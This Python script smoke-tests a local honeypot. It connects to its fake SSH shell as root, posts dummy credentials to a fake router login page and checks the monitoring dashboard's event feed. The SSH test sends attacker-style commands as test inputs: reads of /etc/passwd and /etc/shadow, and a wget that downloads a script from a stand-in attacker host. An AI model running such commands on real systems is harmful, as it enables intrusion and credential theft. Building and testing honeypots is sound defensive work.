import sys
import time

import paramiko
import urllib.error
import urllib.request

HOST = "127.0.0.1"
SSH_PORT = 2222
HTTP_PORT = 8080
DASH_PORT = 5000

results = []


def record(name, ok, note=""):
    results.append(ok)
    status = "PASS" if ok else "FAIL"
    print(f" [{status}] {name}" + (f" - {note}" if note else ""))


def drain(chan, seconds=1.5):
    out = ""
    deadline = time.time() + seconds
    while time.time() < deadline:
        if chan.recv_ready():
            out += chan.recv(65535).decode("utf-8", errors="replace")
            deadline = max(deadline, time.time() + 0.4)
        else:
            time.sleep(0.05)
    return out


def test_ssh():
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(HOST, port=SSH_PORT, username="root", password="toor123",
                   look_for_keys=False, allow_agent=False, timeout=10)
    chan = client.invoke_shell(term="xterm")
    buffer = ""
    buffer += drain(chan, 2.5)

    checks = {
        "whoami": "root",
        "uname -a": "Linux web01",
        "cat /etc/passwd": "sshd",
        "ls -la": "notes.txt",
        "wget http://evil.example/x.sh": "Resolving",
        "sudo cat /etc/shadow": "Permission denied",
    }
    for cmd, expect in checks.items():
        chan.send(cmd + "\n")
        buffer += drain(chan)
        record(f"ssh '{cmd}'", expect.lower() in buffer.lower(),
               f"expected substring: {expect!r}")
    chan.close()
    client.close()


def test_http():
    resp = urllib.request.urlopen(f"http://{HOST}:{HTTP_PORT}/", timeout=10)
    body = resp.read().decode("utf-8", errors="replace")
    record("http GET /", "router login".lower() in body.lower())

    resp = urllib.request.urlopen(f"http://{HOST}:{HTTP_PORT}/robots.txt", timeout=10)
    record("http GET /robots.txt", "Disallow" in resp.read().decode())

    data = urllib.parse.urlencode({"username": "admin", "password": "hunter2"}).encode()
    req = urllib.request.Request(f"http://{HOST}:{HTTP_PORT}/login", data=data)
    resp = urllib.request.urlopen(req, timeout=10)
    record("http POST /login (creds captured)", resp.status == 200)

    try:
        urllib.request.urlopen(f"http://{HOST}:{HTTP_PORT}/nonexistent", timeout=10)
        record("http 404 handling", False)
    except urllib.error.HTTPError as err:
        record("http 404 handling", err.code == 404)


def test_dashboard():
    import json
    raw = urllib.request.urlopen(f"http://{HOST}:{DASH_PORT}/api/stats", timeout=10)
    stats = json.loads(raw.read().decode())
    totals = stats.get("totals", {})
    record("dashboard /api/stats", totals.get("logins", 0) >= 2,
           f"logins so far: {totals.get('logins')}")
    raw = urllib.request.urlopen(f"http://{HOST}:{DASH_PORT}/api/events", timeout=10)
    events = json.loads(raw.read().decode()).get("events", [])
    kinds = {e.get("kind") for e in events}
    expected = {"connection", "auth", "command", "http_request"}
    record("dashboard event feed", expected.issubset(kinds),
           f"kinds seen: {sorted(expected & kinds)}")


if __name__ == "__main__":
    import urllib.parse
    print(f"[*] Smoke-testing honeypot on {HOST}")
    test_ssh()
    test_http()
    test_dashboard()
    passed = sum(results)
    print(f"\n{passed}/{len(results)} checks passed")
    sys.exit(0 if passed == len(results) else 1)
